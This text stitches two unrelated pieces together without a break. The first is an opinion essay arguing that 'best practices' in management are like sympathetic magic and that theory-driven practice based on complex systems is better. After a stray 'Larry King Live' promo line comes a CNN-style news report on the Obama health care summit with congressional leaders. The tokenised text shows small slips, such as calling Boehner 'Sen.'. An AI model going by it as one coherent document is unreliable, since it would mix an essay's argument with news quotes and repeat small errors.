Best practices are a ridiculous way of learning about the world because their rote application is similar to sympathetic magic .
It ’s like building a model of something , building a doll that has a likeness of something else , and hoping that the effects will transfer .
Reproducing similar types of interventions in a different contexts is dangerous and naive unless you have an understanding of what the context was , how the intervention interacted with it , and why the effect occurred .
The notion that one can directly apply interventions to reproduce outcome phenomena without an understanding of the underlying mechanism is ignorant unless you ’re dealing with a deterministic physical or chemical system .
Most of the interactions that matter in our lives are n’t deterministic however ( some of the really important ones are n’t even probabilistic ) , so it ’s time we stopped behaving like they were .
To be effective we need to start to moving away from “ best practice ” models and towards what Dave Snowden calls “ theory driven practice ” .
The “ T word ”
A lot of my experience in corporate and government consulting is that there is an anti-intellectual relationship to true understanding .
Most big organisations , be they private or public , have a very uncomfortable relationship to theory .
This is why people want practice ; best practice .
“ Just show me something that works . ”
Unfortunately our social and organisational lives take place in domains that are complex , dynamic and interactive .
Simply reproducing something that works in one place and re-applying it somewhere else can be a naive and dangerous thing to do .
Even in the same organisation , if one were to try to re-apply an intervention that worked once at at a different time , it would produce different results because the component parts and the relationships which constitute it have changed .
Furthermore , the relationship between the organisation and its environment will have changed as well .
So the imposition of the intervention is not only likely to fail , but likely to produce entirely unpredictable and surprising results .
This is probably one reason why so many change efforts fail in large organisation .
Many “ change efforts ” are lead by the big consulting firms , who take “ best practice ” examples from a few textbook cases or from other clients and then repurpose them from one company to another , ad infinitum , at a healthy profit .
This would work fine if organisations were like machines – machines for which we had the blueprints – and if changing one lever would produce the same effect every time you pulled it .
The reality is that our most important interactions take place in social and ecological systems for which we do n’t have blueprints .
And not only do we not have blueprints , even if we did , they would be changing over time and space and the very act of our looking at them would alter them .
This is bad news for the anti-intellectuals ( and the football captain consultants ) .
It means that if you really want to produce an outcome effect , you have to understand the underlying mechanisms and systems of which it is a part .
In other words , you have to understand the theory .
Theory - driven practice , in practice , equals awareness ?
Once one engages with the concept of theory - driven practice , however – as soon as one understands that you have to actually understand the underlying dynamics and interacitons to understand why actions produce certain outcomes – the situation becomes even more sticky .
Why ?
Because we live in one giant complex adaptive system , with many different interacting actors with different levels of awareness , connectedness and influence , pursuing different agendas at different times , resulting in a constantly evolving landscape of interaction and causality .
Taken literally , this means that sometimes there actually is n’t a direct relationship between cause and effect in many of the cases that matter most to us .
Most big events in the social world are mutually causal , which means that they can not be predicted .
The landscape is constantly evolving , which means they cannot be repeated , and we labour under structurally uncertain , which means we cannot predict the effects of our actions .
This is what the term co-evolution really means .
All this means that our governments , companies and organisations really are n’t like big machines , and that the theory required to interact with them effectively requires a fundamental re-assessment of the very notion of concepts such as “ best practice ” .
The only responsible thing that one can do when operating in this domain is to test , sense , interpret , theorise , test , sense , interpret , theorise , etc. , all the while producing highly specific and temporally contingent local results ( again , hat tip to Snowden and the sensemaking guys for this terminology ) .
From a consulting or management standpoint , this means that every single case is unique , every single case is different , and the process of interaction , exploration and co-creation has to be undertaken at every step , with every client and at every stage , in a unique and bespoke manner .
That is why it is important to take a theory - driven approach , drawing from the evidence and theories of complex adaptive systems , to any social or organisational change effort .
That is why it is important to use tools which recognise structural uncertainty and works best in dynamic environments .
And that is why best practices can be dangerous and deceptive , and why theory - driven practice is the only responsible philosophy which a manager should follow .
The debate heats up later on " Larry King Live " at 9 ET as Democrat Howard Dean and Republican Bill Frist face off .
Washington ( CNN ) -- President Obama and Republican and Democratic leaders engaged in a spirited but civil debate at a health care summit Thursday , finding agreement on some issues but appearing to find little common ground on how to move forward in a bipartisan way .
" I do n't know , frankly , whether we can close that gap , " said President Obama as the day - long meeting closed .
If agreement is not reached , he said , there will be " a lot of arguments about procedures in Congress about moving forward , " an apparent reference to using a parliamentary shortcut under which a health care bill could be passed with a simple majority instead of the 60 - vote supermajority the body requires to overcome the filibuster which Republicans have threatened to use .
" My hope had been there might be enough areas of overlap to realistically think about moving forward without a situation in which everyone just goes to their respective corners and this ends up being a political fight , " he said .
" Frankly , I was discourage by the outcome , " Senate GOP leader Mitch McConnell of Kentucky , told reporters after the meeting .
He urged the Democrats to " start over and go step by step and target the areas of possible agreement that we discussed in the meeting today . "
Sen . John Boehner , R - Ohio , sounded equally unenthusiastic .
" I think the American people want us to work together on common steps to make our current system work better , " he said .
" We ca n't do it within the framework of a 2,700 - page bill . "
Live updates from the health care summit
" The president let everybody talk and talk and talk , " said Senate Majority Leader Harry Reid , who called Obama " the most patient man in the world . "
Though there were areas of agreement , he said , " every Republican used the same talking points . "
He , too , appeared to raise the specter of attempting to move forward through the parliamentary shortcut , known as reconciliation .
" It 's time we do something and we 're going to do it , " the Nevada Democrat said .
House Speaker Nancy Pelosi said she was " not overly optimistic " that the Democrats would be able to attract Republican votes for the health care bill .
Obama said in opening remarks that " it is absolutely critical to begin now moving on what is one of the biggest drags on the economy . "
The situation affects not just people without health insurance , but also those who have it , he said .
" The problem is not getting better , " he said .
" It is getting worse . "
Share your reaction to the summit
Obama called on Republican and Democratic leaders at the much - publicized summit to " not focus on where we differ , but focus on where we agree . "
The differences were evident , though , in what each side believes should happen next .
Republican Sen. Lamar
Alexander , who made the opening remarks for his party , said Democrats should scrap existing bills passed by the House and Senate and start over on new legislation .
Watch what areas Democrats and Republicans can agree on
That 's not going to happen , Democrats answered , saying Americans cannot wait .
" For them , they do n't have time for us to start over , " House Speaker Nancy Pelosi said .
Jon Kyl , the Senate Republican
Whip , pointed out that a major philosophical difference between the two sides is who should be in charge of the health care system -- the government or private industry .
" There 's so much in the bills you have supported that puts so much control in Washington , " Kyl said to Obama .
House Republican Whip Eric Cantor also highlighted that concern , pointing out that Republicans are nearly unanimous in their opposition to the bills .
" There is a reason we voted no , " Cantor said to Obama .
" It does have to do with the philosophical differences you pointed out .
It also has to do with our fear that Washington can define what are essential health benefits . "
Democratic Sen .
Tom Harkin made an impassioned plea for passage of health care reform , saying the current system discriminates against people who are already sick .
Watch Harkin's plea for everyone to have insurance
Racial segregation has been outlawed , he said , " however we still allow segregation today on the basis of your health . "
Fellow Democratic Sen. Jay Rockefeller urged greater oversight of the health insurance sector , which he called " a shark that swims just below the water . "
" This is a rapacious industry that does what it wants , unknown to the people of America except on an individual basis , " Rockefeller said .
Critics had said before the nationally televised summit started that it would amount to a public relations stunt .
" This is about theater , " said Sen. John Cornyn , a Texas Republican .
" This is not about substance , unfortunately . "
Watch what 's at stake at the health care summit
Obama addressed that concern in his opening remarks .
" I hope this is n't political theater where people are playing to the camera , " he said .
Obama said Republicans and Democrats seem to agree that costs have to be contained .
" It 's absolutely true that if all we 're doing is adding more people to a broken system , then costs will continue to skyrocket , " he said .
Republican Sen . Tom Coburn , who is a physician , listed several ways to cut costs , including focusing on disease prevention and management as well as cracking down on fraud .
Coburn also blasted what he called the " extortion " behind frivolous lawsuits that make doctors victims of the current legal system .
" A large number of the tests we order every day are not for the patients , they 're for the doctors , " Coburn said .
Another Republican physician , Rep. Charles Boustany of Louisiana , said doctors also would like a plan that would " simplify , streamline and standardize all paperwork that is involved . "
The cumbersome paperwork , he said , " takes you away from patient care . "
The discussion took a testy tone when Republican Sen. John McCain of Arizona complained about how the Democrats handled the process of approving the legislation .
McCain , who lost to Obama in the 2008 presidential race , said candidate Obama had pledged eight times that the health care debate would be conducted in the open and televised by C - SPAN .
Instead , McCain said , the legislation was " produced behind closed doors ... with unsavory deals . "
Obama tried to break in , but McCain asked to be allowed to finish .
After McCain was done , Obama seemed to flash some anger when he said , " We 're not campaigning .
The election is over . "
Said McCain with a slight laugh , " I 'm reminded of that every day . "
At one point , both men tried to talk over each other .
" The focus should not be on the issue of how we get a bill done , " Obama said .
McCain replied that " the American people care about what we do and how we do it . "
Obama cut off the discussion when he said , " We can have a debate about process or we can have a debate about how we help the American people . "
Fact Check : How common is the Senate use of reconciliation ?
After the meeting , McCain told reporters in a conference call , " A conversation like this is bound to be a good thing .
I just wish we had started it a year ago instead of jamming it through . "
He said he hopes the Democrats will refrain from using reconciliation , urging that " the 60 - vote procedure of the Senate be protected . "
Obama also seemed to take a shot at Cantor , who stacked the voluminous House and Senate health care reform bills on the table in front of him .
The president called the display " props " and said , " These are the kinds of political things we do that prevent us from having a conversation . "
On Wednesday , Sen. Chris Dodd , a key author of the Senate health care bill , told reporters flatly that if Republicans continued to demand that Democrats scrap their health care proposals and start over , " then there 's nothing to talk about . "
But McConnell argued that starting over is exactly what Republicans want .
" Unless they 're willing to do that , I think it 's nearly impossible to imagine a scenario under which we can reach agreement because we do n't think we ought to pass a 2,700 - page bill that seeks to restructure one - sixth of our economy , " McConnell said .
Watch as opposing sides protest at health summit
He warned the political consequences would be severe if Democrats moved forward without Republican support .
Dodd said Democrats and Republicans could find common ground in some areas , such as the Republican push to allow insurers to sell insurance across state lines .
He called the GOP proposal " a legitimate issue , " but said Democrats already have a version of that proposal in their legislation .
White House spokesman Robert Gibbs expressed confidence Thursday that a bill will pass .
" We 're very close to health care reform for the American people , " he said .
Three top Democratic sources privately told CNN the new goal is to pass the final legislation by the end of March or else Congress will have to move back to other issues like job creation and unfinished spending bills .
The meeting took place across the street from the White House , in the Garden Room at Blair House .
The summit discussions were based around four themes -- controlling costs , insurance reforms , reducing the deficit and expanding coverage .
CNN 's Dana Bash , Ed Henry , Kristi Keck and Deirdre Walsh contributed to this report .
